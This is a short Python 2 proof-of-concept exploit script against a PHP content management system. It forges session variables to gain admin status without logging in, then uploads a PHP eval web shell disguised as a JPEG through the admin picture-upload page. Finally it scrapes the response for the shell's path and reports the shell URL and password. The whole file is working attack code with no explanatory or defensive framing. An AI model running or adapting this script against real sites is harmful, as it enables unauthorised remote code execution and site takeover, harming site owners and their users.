#!/usr/bin/env python		
#coding:utf-8

import requests
import urlparse
import re

payload1 = {
	'_SESSION[login_in]':1,
	'_SESSION[admin]':1,
	'_SESSION[login_time]':'99999999999'
	}

def fixurl(url):
	if url.startswith('http://') or url.startswith('https://'):
		return url 
	else:
		url = 'http://'+url
		return url 

def poc(url):
	#获取session
	url = fixurl(url)
	t = urlparse.urlparse(url)
	url1 = t.scheme+'://'+t.netloc+'/index.php'
	s = requests.session()
	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}
	try:
		s.post(url,data=payload1,headers=headers,timeout=3)
	except:
		return False

	# 文件上传
	url2 = t.scheme+'://'+t.netloc+'/admin/admin_pic_upload.php?type=radio&get=thumb'
	#print url2
	data = {
		'pic_cate':1,
		'thumb':1,
		'is_thumb':1,
		'thumb_width':300,
		'thumb_height':200,
		'is_alt':0,
		'num':3,
		'pic_alt[]':'xx' ,
		'uppic':1

	}
	files = {'up[]':('2.php','<?php @eval($_POST[1]);?>','image/jpeg')}
	try:
		res = s.post(url2,files=files,data=data,headers=headers,timeout=3)
		shell_path = re.findall('<input style="display:none" type="radio" rel=".*?" id="pic_sl" value="(.*?)" name="pic_sl"/>',res.content)
		for shell in shell_path:
			if 'php' in shell:
				return '[*]shell:'+url+'/upload/'+shell_path[0]+ '  [password:1]'
				break
		return False
	except:
		return False



if __name__ == '__main__':
	poc('http://localhost/')